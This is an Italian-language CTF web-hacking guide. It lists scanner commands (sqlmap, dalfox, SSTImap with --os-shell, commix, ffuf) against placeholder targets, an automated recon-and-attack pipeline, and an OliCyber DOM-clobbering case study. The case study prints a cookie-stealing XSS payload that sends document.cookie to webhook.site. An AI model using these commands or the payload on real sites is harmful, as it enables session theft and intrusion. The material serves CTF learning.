# CTF — Web Hacking Toolkit

Guida rapida agli attacchi web nelle CTF: quali tool usare, come funzionano e come installarli tutti in un colpo solo.

---

## Metodologia in 4 fasi

1. **Mappa** — scopri endpoint, parametri e tecnologie (`ffuf`, `arjun`, `nuclei`)
2. **Capisci la logica** — leggi il JS lato client, i commenti HTML, le risposte (Burp Suite)
3. **Automatizza** — punta lo scanner giusto sul parametro giusto (`sqlmap`, `dalfox`, `sstimap`)
4. **Exploit manuale** — quando il bug è custom (es. DOM clobbering), nessun tool lo trova: serve il cervello

> Regola d'oro: nelle CTF la vulnerabilità è quasi sempre dove gli scanner non guardano. Gli scanner servono a risparmiare tempo sulle cose standard, non a risolvere la challenge.

---

## I tool per tipo di attacco

### SQL Injection — sqlmap

Rileva e sfrutta SQLi in automatico (error-based, UNION, boolean/time-based blind), fino al dump del DB.

```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/login" --data "user=a&pass=b" --batch --level 3
sqlmap -u "http://target/" --cookie "session=XXX" --batch
```

### XSS — dalfox / XSStrike

**dalfox**: trova i parametri, testa polyglot e verifica l'esecuzione con un headless browser (pochi falsi positivi):

```bash
dalfox url "http://target/search?q=test" --silence
```

**XSStrike**: analizza il contesto di reflection (HTML, attributo, JS) e genera payload su misura:

```bash
xsstrike -u "http://target/search?q=test"
```

⚠️ Per gli XSS con admin-bot (cookie stealing) il payload finale lo scrivi tu: i tool trovano l'injection point, l'esfiltrazione verso webhook.site è manuale.

### SSTI — SSTImap

Rileva il template engine (Jinja2, Twig, FreeMarker…) e scala fino a RCE:

```bash
sstimap -u "http://target/page?name=test"
sstimap -u "http://target/page?name=test" --os-cmd "id"
sstimap -u "http://target/page?name=test" --os-shell
```

### Command Injection — commix

```bash
commix --url "http://target/ping?host=127.0.0.1" --batch
```

### LFI / Path Traversal — ffuf + wordlist

```bash
ffuf -u "http://target/view?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0
```

### Scanner generalisti

- **Burp Suite** (Community): il proxy manuale è indispensabile; lo scanner automatico è solo nella Pro
- **OWASP ZAP**: scanner attivo gratuito, alternativa open a Burp Pro
- **nuclei**: template per CVE e misconfig — `nuclei -u http://target -severity critical,high,medium`

---

## Installazione tutto-in-uno

Dalla console SeaLion:

```
install ctf-web-toolkit
```

Installa in una botta sola: **dalfox, SSTImap, XSStrike, dirsearch, OWASP ZAP**.
(sqlmap, ffuf, nuclei, commix, nikto, Burp… risultano già presenti sul sistema.)

---

## L'attacco unico: ctf-web-recon

Pipeline ricognizione → attacco in un solo comando:

```
install ctf-web-recon
ctf-wr -u http://target
```

Fasi eseguite in sequenza:

1. **ffuf** — directory/file discovery
2. **arjun** — ricerca parametri nascosti sugli endpoint trovati
3. **nuclei** — CVE note e misconfigurazioni
4. **dalfox** — XSS su ogni URL con parametri
5. **sqlmap** — SQLi su ogni URL con parametri
6. **sstimap** — SSTI su ogni URL con parametri

Ogni fase scrive i risultati in una cartella di output e alla fine trovi un `report.md` riassuntivo. I tool mancanti vengono saltati con un avviso (installali con `ctf-web-toolkit`).

```bash
ctf-wr -u http://target -o outdir          # output personalizzato
ctf-wr -u http://target -c "session=XXX"   # dietro login
ctf-wr -u http://target --skip xss,sqli    # salta fasi
ctf-wr -u http://target --fast             # timeout ridotti
```

---

## Caso studio: perche' il manuale conta (OliCyber — debug_disabilitato)

La pagina sanitizzava le note con DOMPurify, ma un branch `if (window.debug)` rifaceva `document.write` del contenuto **raw**. `window.debug` era commentato… però un elemento HTML con `id="debug"` nel DOM rende `window.debug` truthy (**DOM clobbering**):

```html
<p id="debug"></p><script>location.href="https://webhook.site/UUID?c="+document.cookie</script>
```

Nessuno scanner avrebbe trovato questa catena: leggere il JS lato client resta l'arma principale nelle CTF web.
